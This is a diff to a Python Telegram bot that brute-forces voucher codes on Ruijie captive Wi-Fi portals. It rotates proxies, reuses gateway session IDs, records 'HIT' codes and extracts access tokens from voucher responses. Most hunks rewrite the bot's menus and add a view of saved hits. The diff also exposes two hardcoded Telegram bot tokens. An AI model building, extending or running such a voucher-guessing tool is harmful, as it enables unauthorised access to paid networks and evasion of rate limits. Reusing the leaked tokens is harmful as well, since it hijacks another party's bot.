@@ -78,8 +78,8 @@ def log(*args, **kwargs):
 #  CONFIG
 # ==============================================================================
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8806693453:AAEK1F7FTsAHMc5PdfeIYeIlWHJgbnGRb8o")
-ADMIN_IDS = [8806693453]
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8400956534:AAGhysVeI9CqHJX8wuVrpguWlZPbRu6Q9Eg")
+ADMIN_IDS = [7856294500]
 CONTACT_USERNAME = "@NgaTON_0"
 CONTACT_LINK = "https://t.me/NgaTON_0"
 
@@ -134,6 +134,7 @@ _MODE_SPEC: Dict[str, Tuple[tuple, int]] = {
     "num9": (_T_D, 9), "num10": (_T_D, 10),
     "eng6": (_T_A, 6), "eng7": (_T_A, 7), "eng8": (_T_A, 8),
     "mix6": (_T_M, 6), "mix7": (_T_M, 7), "mix8": (_T_M, 8),
+    "mix9": (_T_M, 9),
     "abc6": (_T_A, 6),
 }
 
@@ -141,7 +142,8 @@ MODES = {
     "num6": "🩸 06 • NUM", "num7": "🩸 07 • NUM", "num8": "🩸 08 • NUM",
     "num9": "🩸 09 • NUM", "num10": "🩸 10 • NUM",
     "eng6": "🦇 06 • ENG", "eng7": "🦇 07 • ENG", "eng8": "🦇 08 • ENG",
-    "mix6": "💀 06 • MIX", "mix7": "💀 07 • MIX", "mix8": "💀 08 • MIX", "mix9": "🗝️ 09 • MIX"
+    "mix6": "💀 06 • MIX", "mix7": "💀 07 • MIX", "mix8": "💀 08 • MIX",
+    "mix9": "💀 09 • MIX",
     "abc6": "📜 06 • ABC", "custom": "🔮 Custom",
 }
 
@@ -1034,7 +1036,6 @@ async def worker(worker_id, headers_unused, user_id):
             session_codes = 0
 
             while not stop_event.is_set() and session_codes < MAX_CODES_PER_SESSION:
-                #  FIXED: reuse sid until MAX_CODES_PER_SID
                 if sid is None or codes_this_sid >= MAX_CODES_PER_SID:
                     new_sid, _ = await get_sid_from_gateway(session, state["portal_url"])
                     if not new_sid:
@@ -1085,7 +1086,6 @@ async def worker(worker_id, headers_unused, user_id):
                     state["last_hit"] = code
                     state["recent_logs"].append(f"🔥 HIT: {code}")
 
-                    # FIXED: extract token from voucher response
                     active_token = sid
                     if body:
                         m = re.search(r'token=([^&\s"\'<>]+)', body, re.IGNORECASE)
@@ -1401,6 +1401,7 @@ def get_main_menu_markup():
         [InlineKeyboardButton("👁️ STATUS", callback_data="btn_proxy_status"),
          InlineKeyboardButton("🧹 CLEAR", callback_data="btn_clear_proxies")],
         [InlineKeyboardButton("🕷️ PROXIES", callback_data="btn_add_proxies")],
+        [InlineKeyboardButton("💾 SAVED", callback_data="btn_view_saved")],
         [InlineKeyboardButton("⚡ NGATON ⚡", url=CONTACT_LINK)],
     ])
 
@@ -1418,8 +1419,9 @@ def get_mode_menu_markup():
         [InlineKeyboardButton("💀 06 MIX", callback_data="set_mode_mix6"),
          InlineKeyboardButton("💀 07 MIX", callback_data="set_mode_mix7")],
         [InlineKeyboardButton("💀 08 MIX", callback_data="set_mode_mix8"),
-         InlineKeyboardButton("📜 06 ABC", callback_data="set_mode_abc6")],
-        [InlineKeyboardButton("🔮 CUSTOM", callback_data="set_mode_custom")],
+         InlineKeyboardButton("💀 09 MIX", callback_data="set_mode_mix9")],
+        [InlineKeyboardButton("📜 06 ABC", callback_data="set_mode_abc6"),
+         InlineKeyboardButton("🔮 CUSTOM", callback_data="set_mode_custom")],
         [InlineKeyboardButton("🦇 RETURN", callback_data="btn_back_main")],
     ])
 
@@ -1456,346 +1458,302 @@ def _build_main_menu_text(mode, active, saved_url, user_id):
         f"{portal_line}\n"
         f"{resume_line}"
         "\n"
-        "💡 <b>Setup:</b> Portal → Proxies → Start\n"
-        "📌 Contact: @NgaTON_0"
+        "╭─ ⚡ NGATON · @NgaTON_0 ─╮"
     )
 
 
 # ==============================================================================
-#  /start
+#  TELEGRAM HANDLERS
 # ==============================================================================
 
-async def start(update, context, *args, **kwargs):
+async def cmd_start(update, context):
     user_id = update.effective_user.id
+    pm = get_proxy_manager()
     mode = context.user_data.get("selected_mode", "num6")
+    active = pm.get_active_count()
     saved_url = get_user_portal(user_id)
-    active = get_proxy_manager().get_active_count()
-    text = _build_main_menu_text(mode, active, bool(saved_url), user_id)
-    await update.message.reply_text(
-        text, parse_mode=ParseMode.HTML,
-        reply_markup=get_main_menu_markup())
+
+    text = _build_main_menu_text(mode, active, saved_url, user_id)
+    markup = get_main_menu_markup()
+
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
 
 
-# ==============================================================================
-#  /stop
-# ==============================================================================
+async def callback_handler(update, context):
+    query = update.callback_query
+    user_id = query.from_user.id
+    data = query.data
 
-async def stop_command(update, context, *args, **kwargs):
-    user_id = update.effective_user.id
-    state = user_scanners.get(user_id)
-    if state and not state["stop_event"].is_set():
-        state["stop_event"].set()
+    await query.answer()
+
+    # ─── MODE SELECTION ───
+    if data.startswith("set_mode_"):
+        mode_key = data.replace("set_mode_", "")
+        if mode_key in MODES:
+            context.user_data["selected_mode"] = mode_key
+            pm = get_proxy_manager()
+            active = pm.get_active_count()
+            saved_url = get_user_portal(user_id)
+
+            text = _build_main_menu_text(mode_key, active, saved_url, user_id)
+            markup = get_main_menu_markup()
+
+            try:
+                await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
+            except Exception:
+                pass
+        return
+
+    # ─── BACK TO MAIN ───
+    if data == "btn_back_main":
+        pm = get_proxy_manager()
+        mode = context.user_data.get("selected_mode", "num6")
+        active = pm.get_active_count()
+        saved_url = get_user_portal(user_id)
+
+        text = _build_main_menu_text(mode, active, saved_url, user_id)
+        markup = get_main_menu_markup()
+
         try:
-            _flush_pending_codes_sync(user_id)
-            save_state_now(user_id, state)
+            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
         except Exception:
             pass
-        await update.message.reply_text(
-            "🛑 <b>FORCE STOPPED</b>\n\n"
-            f"💾 Saved: <code>{state['tried']:,}</code> tried · "
-            f"<code>{state['hits']}</code> hits\n"
-            "🔁 /start → resume anytime",
-            parse_mode=ParseMode.HTML,
-            reply_markup=get_back_markup())
-    else:
-        await update.message.reply_text("ℹ️ No active scan.", reply_markup=get_back_markup())
+        return
 
-
-# ==============================================================================
-#  CALLBACKS
-# ==============================================================================
-
-async def handle_callbacks(update, context, *args, **kwargs):
-    query = update.callback_query
-    user_id = update.effective_user.id
-    data = query.data
-    try:
-        await query.answer()
-    except Exception:
-        pass
-    mode = context.user_data.get("selected_mode", "num6")
-    pm = get_proxy_manager()
-    active = pm.get_active_count()
-
-    try:
-        if data == "btn_back_main":
-            for f in ("waiting_for_proxy_text", "waiting_for_portal_url", "waiting_for_digit"):
-                context.user_data[f] = False
-            saved_url = get_user_portal(user_id)
-            text = _build_main_menu_text(mode, active, bool(saved_url), user_id)
-            await query.edit_message_text(text, parse_mode=ParseMode.HTML,
-                reply_markup=get_main_menu_markup())
-            return
-
-        if data == "btn_back_mode":
-            context.user_data["waiting_for_digit"] = False
-            await query.edit_message_text("📜 <b>SELECT MODE</b>",
-                parse_mode=ParseMode.HTML, reply_markup=get_mode_menu_markup())
-            return
-
-        if data.startswith("set_mode_"):
-            new_mode = data[len("set_mode_"):]
-            context.user_data["selected_mode"] = new_mode
-            mode = new_mode
-            if new_mode == "custom":
-                context.user_data["waiting_for_digit"] = True
-                await query.edit_message_text(
-                    "🔮 <b>CUSTOM MODE</b>\n\nSend starting digit (0-9):",
-                    parse_mode=ParseMode.HTML,
-                    reply_markup=get_back_markup("btn_back_mode"))
-                return
-            proxy_line = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
+    # ─── MODE MENU ───
+    if data == "btn_mode_menu":
+        try:
             await query.edit_message_text(
-                f"✅ Mode Set!\n\n⚡ <b>NGATON</b> ⚡\n\n"
-                f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n{proxy_line}",
+                "📜 <b>SELECT MODE</b>\n\n"
+                "🩸 NUM = Digits only\n"
+                "🦇 ENG = Letters only\n"
+                "💀 MIX = Digits + Letters\n"
+                "📜 ABC = Letters (no l/o)\n"
+                "🔮 CUSTOM = Sequential\n\n"
+                "╭─ ⚡ NGATON ─╮",
                 parse_mode=ParseMode.HTML,
-                reply_markup=get_main_menu_markup())
-            return
+                reply_markup=get_mode_menu_markup()
+            )
+        except Exception:
+            pass
+        return
 
-        if data == "btn_update_portal":
-            context.user_data["waiting_for_portal_url"] = True
+    # ─── PORTAL ───
+    if data == "btn_update_portal":
+        context.user_data["awaiting_portal"] = True
+        try:
             await query.edit_message_text(
-                "🔮 <b>PORTAL BINDING</b>\n\n"
-                "Send target Portal URL.\n\n"
-                "⚠️ <b>URL change → job resets</b>",
+                "🔮 <b>SEND PORTAL URL</b>\n\n"
+                "Example:\n"
+                "<code>https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?res=...</code>\n\n"
+                "📌 Send your portal URL now",
                 parse_mode=ParseMode.HTML,
-                reply_markup=get_back_markup())
-            return
+                reply_markup=get_back_markup()
+            )
+        except Exception:
+            pass
+        return
 
-        if data == "btn_mode_menu":
-            await query.edit_message_text("📜 <b>SELECT MODE</b>",
-                parse_mode=ParseMode.HTML, reply_markup=get_mode_menu_markup())
+    # ─── START SCANNER ───
+    if data == "btn_start_scanner":
+        if user_scanners.get(user_id, {}).get("running"):
+            await query.answer("⚠️ Already running!", show_alert=True)
             return
+        asyncio.create_task(run_user_scanner(context, user_id))
+        return
 
-        if data == "btn_add_proxies":
-            context.user_data["waiting_for_proxy_text"] = True
-            proxy_line = f"👁️ Active: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
-            await query.edit_message_text(
-                "🕷️ <b>PROXY NEXUS</b>\n\n"
-                "Format:\n<code>123.45.67.89:8080</code>\n"
-                "<code>socks5://user:pass@host:1080</code>\n\n"
-                f"{proxy_line}",
-                parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
-            return
-
-        if data == "btn_proxy_status":
-            sample = pm.proxies[:5] if pm.proxies else []
-            ss = "\n".join(f"  ▸ <code>{p}</code>" for p in sample) if sample else "  💀 None"
-            ml = "⚡ DIRECT" if active == 0 else f"🕷️ {active}"
-            await query.edit_message_text(
-                f"👁️ <b>PROXY STATUS</b>\n"
-                f"┌───────────────────────┐\n  {ml}\n└───────────────────────┘\n"
-                f"<b>Sample:</b>\n{ss}",
-                parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
-            return
-
-        if data == "btn_clear_proxies":
+    # ─── STOP SCAN ───
+    if data == "stop_scan":
+        state = user_scanners.get(user_id)
+        if state and state.get("running"):
+            state["stop_event"].set()
             try:
-                with open(PROXY_FILE, "w"):
-                    pass
-                pm.proxies = []
-                pm.index = 0
-            except OSError:
+                await query.edit_message_text(
+                    "🛑 <b>Stopping...</b>\n💾 Saving state...",
+                    parse_mode=ParseMode.HTML
+                )
+            except Exception:
                 pass
-            await query.edit_message_text(
-                "🧹 <b>Proxies cleared!</b>",
-                parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
-            return
+        else:
+            try:
+                await query.answer("Not running", show_alert=True)
+            except Exception:
+                pass
+        return
 
-        if data == "btn_start_scanner":
-            await query.edit_message_text("⚡ Starting scanner...")
-            asyncio.create_task(run_user_scanner(context, user_id))
-            return
-
-        if data == "stop_scan":
-            state = user_scanners.get(user_id)
-            if state and not state["stop_event"].is_set():
-                state["stop_event"].set()
-                try:
-                    _flush_pending_codes_sync(user_id)
-                    save_state_now(user_id, state)
-                except Exception:
-                    pass
-                await query.edit_message_text(
-                    "🛑 <b>Scan Stopped</b>\n\n💾 Saved — /start to resume",
-                    parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
-            else:
-                await query.edit_message_text(
-                    "ℹ️ No active scan.",
-                    parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
-            return
-    except Exception as e:
-        log(f"[CB ERR] {type(e).__name__}: {e}")
-
-
-# ==============================================================================
-#  TEXT HANDLER
-# ==============================================================================
-
-async def handle_text(update, context, *args, **kwargs):
-    user_id = update.effective_user.id
-    raw_text = (update.message.text or "").strip()
-    pm = get_proxy_manager()
-    mode = context.user_data.get("selected_mode", "num6")
-
-    try:
-        if context.user_data.get("waiting_for_proxy_text"):
-            context.user_data["waiting_for_proxy_text"] = False
-            lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
-            if not lines:
-                await update.message.reply_text("❌ Empty", reply_markup=get_back_markup())
-                return
-            added, invalid = pm.add_proxies(lines)
-            active = pm.get_active_count()
-            await update.message.reply_text(
-                "✅ <b>Proxies Added</b>\n"
-                "┌───────────────────────┐\n"
-                f"  ➕ Added:   <code>{added}</code>\n"
-                f"  ❌ Invalid: <code>{invalid}</code>\n"
-                f"  ✅ Active:  <code>{active}</code>\n"
-                "└───────────────────────┘",
-                parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
-            return
-
-        if context.user_data.get("waiting_for_portal_url"):
-            context.user_data["waiting_for_portal_url"] = False
-            if not raw_text.lower().startswith(("http://", "https://")):
-                await update.message.reply_text("❌ Invalid URL", reply_markup=get_back_markup())
-                return
-
-            old_url = get_user_portal(user_id)
-            url_changed = (old_url is not None and old_url != raw_text)
-
-            set_user_portal(user_id, raw_text)
-
-            if url_changed:
-                clear_saved_state(user_id)
-                clear_tried_codes(user_id)
-                try:
-                    with open(FILE_PATH, "w"):
-                        pass
-                except Exception:
-                    pass
-                await update.message.reply_text(
-                    "🔄 <b>URL CHANGED</b>\n\n"
-                    "🧹 Previous job cleared\n"
-                    "✅ New Portal saved\n\n"
-                    "⚡ Ready to start fresh",
-                    parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
-            else:
-                active = pm.get_active_count()
-                pl = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
-                await update.message.reply_text(
-                    f"✅ <b>Portal Saved</b>\n\n"
-                    f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n{pl}",
-                    parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
-            return
-
-        if context.user_data.get("waiting_for_digit"):
-            context.user_data["waiting_for_digit"] = False
-            if not raw_text.isdigit():
-                await update.message.reply_text("❌ Digits only",
-                    reply_markup=get_back_markup("btn_back_mode"))
-                return
-            context.user_data["start_digit"] = int(raw_text[0])
-            active = pm.get_active_count()
-            pl = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
-            await update.message.reply_text(
-                f"✅ Start Digit = <code>{raw_text[0]}</code>\n\n"
-                f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n{pl}",
-                parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
-            return
-
-        saved_url = get_user_portal(user_id)
+    # ─── PROXY STATUS ───
+    if data == "btn_proxy_status":
+        pm = get_proxy_manager()
         active = pm.get_active_count()
-        text = _build_main_menu_text(mode, active, bool(saved_url), user_id)
-        await update.message.reply_text(
-            text, parse_mode=ParseMode.HTML,
-            reply_markup=get_main_menu_markup())
-    except Exception as e:
-        log(f"[TXT ERR] {type(e).__name__}: {e}")
+        bad = len(pm.bad_proxies)
+        try:
+            await query.edit_message_text(
+                f"👁️ <b>PROXY STATUS</b>\n\n"
+                f"✅ Active: <code>{active}</code>\n"
+                f"❌ Bad:    <code>{bad}</code>\n"
+                f"⚡ Mode:   <code>{'Proxy' if active > 0 else 'Direct'}</code>",
+                parse_mode=ParseMode.HTML,
+                reply_markup=get_back_markup()
+            )
+        except Exception:
+            pass
+        return
+
+    # ─── CLEAR PROXIES ───
+    if data == "btn_clear_proxies":
+        pm = get_proxy_manager()
+        pm.proxies = []
+        pm.bad_proxies = set()
+        pm._save_to_file()
+        try:
+            await query.edit_message_text(
+                "🧹 <b>Proxies Cleared</b>\n\n⚡ Direct Mode",
+                parse_mode=ParseMode.HTML,
+                reply_markup=get_back_markup()
+            )
+        except Exception:
+            pass
+        return
+
+    # ─── ADD PROXIES ───
+    if data == "btn_add_proxies":
+        context.user_data["awaiting_proxies"] = True
+        try:
+            await query.edit_message_text(
+                "🕷️ <b>SEND PROXIES</b>\n\n"
+                "Format: ip:port or user:pass@ip:port\n"
+                "Supports: socks5, socks4, http\n\n"
+                "📌 Send proxies now (one per line or batch)",
+                parse_mode=ParseMode.HTML,
+                reply_markup=get_back_markup()
+            )
+        except Exception:
+            pass
+        return
+
+    # ─── VIEW SAVED ───
+    if data == "btn_view_saved":
+        saved = get_saved_state(user_id)
+        if saved:
+            hit_details = saved.get("hit_details", [])
+            hits_text = ""
+            for h in hit_details[-10:]:
+                hits_text += f"\n  ▸ <code>{h.get('code','?')}</code> • {h.get('plan','?')} • {h.get('time_str','?')}"
+            if not hits_text:
+                hits_text = "\n  💀 No hits"
+
+            text = (
+                "💾 <b>SAVED JOB</b>\n\n"
+                f"📜 Mode:   <code>{MODES.get(saved.get('mode','num6'), '')}</code>\n"
+                f"👁️ Tried:  <code>{saved.get('tried', 0):,}</code>\n"
+                f"🩸 Hits:   <code>{saved.get('hits', 0)}</code>\n"
+                f"⚠️ Limits: <code>{saved.get('limits', 0)}</code>\n"
+                f"🗡️ Last:   <code>{saved.get('last_hit', '—')}</code>\n"
+                f"🕐 Saved:  <code>{saved.get('updated_at', 'N/A')}</code>\n"
+                "\n"
+                f"🎁 <b>HITS</b>{hits_text}\n"
+            )
+            markup = InlineKeyboardMarkup([
+                [InlineKeyboardButton("🗑️ DELETE SAVED", callback_data="btn_delete_saved")],
+                [InlineKeyboardButton("🦇 RETURN", callback_data="btn_back_main")],
+            ])
+        else:
+            text = "💾 <b>No Saved Job</b>\n\n💀 Nothing saved"
+            markup = get_back_markup()
+
+        try:
+            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
+        except Exception:
+            pass
+        return
+
+    # ─── DELETE SAVED ───
+    if data == "btn_delete_saved":
+        clear_saved_state(user_id)
+        clear_tried_codes(user_id)
+        pm = get_proxy_manager()
+        mode = context.user_data.get("selected_mode", "num6")
+        active = pm.get_active_count()
+        saved_url = get_user_portal(user_id)
+
+        text = _build_main_menu_text(mode, active, saved_url, user_id)
+        markup = get_main_menu_markup()
+
+        try:
+            await query.edit_message_text(
+                "🗑️ <b>Saved Job Deleted</b>\n\n" + text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=markup
+            )
+        except Exception:
+            pass
+        return
+
+
+async def message_handler(update, context):
+    user_id = update.effective_user.id
+    text = update.message.text
+
+    # ─── Portal URL ───
+    if context.user_data.get("awaiting_portal"):
+        context.user_data["awaiting_portal"] = False
+        if text and ("http" in text.lower() or "ruijie" in text.lower()):
+            set_user_portal(user_id, text.strip())
+            pm = get_proxy_manager()
+            mode = context.user_data.get("selected_mode", "num6")
+            active = pm.get_active_count()
+
+            reply_text = _build_main_menu_text(mode, active, text.strip(), user_id)
+            await update.message.reply_text(
+                f"✅ <b>Portal Saved!</b>\n\n{reply_text}",
+                parse_mode=ParseMode.HTML,
+                reply_markup=get_main_menu_markup()
+            )
+        else:
+            await update.message.reply_text(
+                "❌ Invalid URL. Send a valid portal URL.",
+                parse_mode=ParseMode.HTML
+            )
+        return
+
+    # ─── Proxies ───
+    if context.user_data.get("awaiting_proxies"):
+        context.user_data["awaiting_proxies"] = False
+        if text:
+            lines = text.strip().splitlines()
+            if not lines:
+                lines = [text.strip()]
+            pm = get_proxy_manager()
+            added, invalid = pm.add_proxies(lines)
+
+            await update.message.reply_text(
+                f"🕷️ <b>Proxies Added</b>\n\n"
+                f"✅ Added:   <code>{added}</code>\n"
+                f"❌ Invalid: <code>{invalid}</code>\n"
+                f"📦 Total:   <code>{pm.get_active_count()}</code>",
+                parse_mode=ParseMode.HTML,
+                reply_markup=get_back_markup()
+            )
+        return
 
 
 # ==============================================================================
-#  ERROR HANDLER
-# ==============================================================================
-
-async def _error_handler(update, context):
-    err = context.error
-    log(f"[ERROR] {type(err).__name__}: {err}")
-    if err:
-        traceback.print_exception(type(err), err, err.__traceback__)
-
-
-# ==============================================================================
-#  POST INIT
-# ==============================================================================
-
-async def _post_init(application):
-    """Start background tasks after bot initializes"""
-    asyncio.create_task(codes_flusher_loop())
-    asyncio.create_task(state_saver_loop())
-    log(bgreen + "[MAIN] Background tasks started" + reset)
-
-
-# ==============================================================================
-#  MAIN — SIMPLIFIED (Replit-safe, no HTTPXRequest, no close_loop)
+#  MAIN
 # ==============================================================================
 
 def main():
+    show_banner()
     ensure_files_exist()
 
-    log("[MAIN] Building Application...")
+    app = Application.builder().token(BOT_TOKEN).build()
 
-    #  FIXED: no HTTPXRequest (Replit crash), post_init wired via builder
-    app = (
-        Application.builder()
-        .token(BOT_TOKEN)
-        .post_init(_post_init)
-        .build()
-    )
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CallbackQueryHandler(callback_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
 
-    log("[MAIN] Application built ✓")
+    log(bgreen + "[Bot] Starting NGATON..." + reset)
+    app.run_polling(drop_pending_updates=True)
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stop", stop_command))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    app.add_handler(CallbackQueryHandler(handle_callbacks))
-    app.add_error_handler(_error_handler)
-
-    log("[MAIN] Handlers registered ✓")
-
-    pm = get_proxy_manager()
-    log(bgreen + f"[MAIN] Proxies: {pm.get_active_count()}" + reset)
-    log(bgreen + f"[MAIN] ⚡ NUM_WORKERS: {NUM_WORKERS}" + reset)
-    log(bgreen + f"[MAIN] 🔁 MAX_CODES_PER_SID: {MAX_CODES_PER_SID}" + reset)
-    log(bgreen + f"[MAIN] 💾 State: {STATE_FILE}" + reset)
-    log(bgreen + f"[MAIN] 💾 Tried: {TRIED_FILE_TMPL}" + reset)
-    log(bgreen + f"[MAIN] 📝 Hits: {FILE_PATH}" + reset)
-    log(bgreen + f"[MAIN] 🔁 Resume: ON" + reset)
-    log(bgreen + f"[MAIN] 🛑 /stop: ON" + reset)
-    log("[MAIN] Starting Telegram polling...", flush=True)
-
-    #  Simple polling — no close_loop, no HTTPXRequest
-    app.run_polling(
-        drop_pending_updates=True,
-        allowed_updates=None,
-    )
-
-    log(f"See you — {CONTACT_USERNAME}")
-
-
-# ==============================================================================
-#  ENTRY POINT
-# ==============================================================================
 
 if __name__ == "__main__":
-    try:
-        show_banner()
-        _proxy_manager = get_proxy_manager()
-        main()
-    except KeyboardInterrupt:
-        log(yellow + "\n[MAIN] Stopped by user" + reset)
-    except BaseException as e:
-        log(bred + f"\n[FATAL] {type(e).__name__}: {e}" + reset)
-        traceback.print_exc()
+    main()
